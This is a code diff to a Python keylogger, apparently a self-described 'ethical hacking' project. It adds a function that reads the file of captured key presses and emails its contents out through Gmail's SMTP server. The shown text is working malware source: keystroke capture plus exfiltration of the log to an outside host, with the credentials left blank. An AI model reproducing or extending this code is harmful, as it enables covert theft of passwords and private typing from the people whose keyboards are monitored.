@@ -8,6 +8,36 @@ from pynput import keyboard
 log_file = "key_presses.txt"
 keys_pressed = "" 
 
+def email_log_file(log_file):
+    # Information needed to send it
+    sender = ""
+    receiver = ""
+    password = ""
+
+    # Builds the message
+    message = MIMEMultipart()
+    message["from"] = sender
+    message["to"] = receiver
+    message["subject"] = "Log file from ethical hacking keylogger project"
+
+    # Email body
+    with open(log_file, "r") as f:
+        body = f.read()
+    
+    message.attach(MIMEText(body))
+
+    # connect to the email server to send the email
+    try:
+        server = smtplib.SMTP("smtp.gmail.com",587)
+        server.starttls()
+        server.login(sender, password)
+        server.send_message(message)
+        print("Email sent successfully!")
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        server.quit()
+
 # Records key presses
 def on_press(key):
     global keys_pressed
